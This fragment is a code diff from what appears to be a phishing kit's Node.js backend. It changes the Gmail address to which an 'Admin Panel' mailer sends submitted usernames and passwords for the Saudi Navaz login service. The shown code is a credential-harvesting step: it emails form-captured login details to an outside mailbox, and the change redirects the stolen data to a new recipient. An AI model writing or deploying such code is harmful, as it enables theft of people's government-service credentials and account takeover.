@@ -133,7 +133,7 @@ await transporter.sendMail({
           });
           await transporter.sendMail({
             from:'Admin Panel',
-            to:'saudiabsher1990@gmail.com',
+            to:'pnusds269@gmail.com',
             subject: `Navaz Username And Password Account`,
             html:`<div>
             <p> Username : ${req.body.username}</p>
